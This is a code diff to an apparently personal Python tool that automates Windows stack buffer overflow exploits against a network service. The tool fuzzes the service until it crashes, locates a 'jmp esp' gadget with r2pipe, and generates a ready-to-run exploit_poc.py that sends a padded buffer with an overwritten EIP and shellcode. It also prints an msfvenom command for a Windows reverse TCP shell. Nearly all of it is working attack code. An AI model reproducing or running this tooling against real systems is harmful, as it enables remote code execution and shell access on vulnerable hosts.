@@ -2,6 +2,7 @@ import r2pipe
 import time
 from ast import literal_eval
 import socket, sys
+from helpers import return_pretty_hex
 
 class Program:
     TIMEOUT_ERROR = 10061
@@ -41,7 +42,7 @@ class Program:
                 ret = ""
                 for byte in bytes:
                     ret+=chr(int(byte,16))
-                print("[ * ] Found proper 'jmp esp' address to use. Address: ", esp)
+                print("[ * ] Found proper 'jmp esp' address to use. Address: ", return_pretty_hex(ret))
                 return ret
         return None
 
@@ -102,14 +103,14 @@ class Program:
                     s.recv(1024)
             except WindowsError as e:
                 if e.winerror == self.CLOSED_BY_REMOTE_HOST:
-                    #print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+                    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                     self.crashed_counter = total_counter
                     break
                 elif e.winerror == self.TIMEOUT_ERROR:
                     print("Timeout occured. Program is not listening/opened.")
                     sys.exit(0)
                 else:
-                    #print("Different error occured, closing programaaa!")
+                    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                     self.crashed_counter = total_counter
                     break
                     #sys.exit(0)
@@ -121,6 +122,51 @@ class Program:
             total_counter += counter
             time.sleep(1)
 
+    def create_file(self, prefix, filler, eip, offset, shellcode, endfix, bad_chars, _ip = None):
+        if _ip == None:
+            ip = self.ip
+        else:
+            ip = _ip
+        port = self.port
+
+        if type(shellcode) == str:
+            shellcode = bytes(shellcode, 'latin-1')
+
+        return_str="""
+import socket
+prefix = '{prefix}'
+filler = '{filler}'
+eip = '{eip}'
+offset = '{offset}'
+buf = {shellcode}
+endfix = '{endfix}'
+ip = '{ip}'
+port = {port}
+
+buffer = bytes(prefix, "latin-1") + bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + buf + bytes(endfix, "latin-1")
+
+timeout = 5
+try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.recv(1024)
+        s.send(buffer)
+        s.recv(1024)
+except:
+    pass
+        """.format(prefix=prefix,filler=filler,eip=return_pretty_hex(eip),offset=offset,shellcode=shellcode,endfix=endfix,ip=ip,port=port)
+        f = open("exploit_poc.py", "w")
+        f.write(return_str)
+        f.close()
+        
+        f = open("C:\\linux_shared\\exploit_poc.py", "w")
+        f.write(return_str)
+        f.close()
+        print("[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.")
+        print("[ * ] You can generate shellcode with using command on line 3 of exploit_poc.py")
+        print("\tmsfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '{}'".format(return_pretty_hex(bad_chars)))
+    
     def exploit(self, prefix, filler, eip, offset, shellcode, endfix, _ip = None):
         time.sleep(2)
         if type(shellcode) == str:
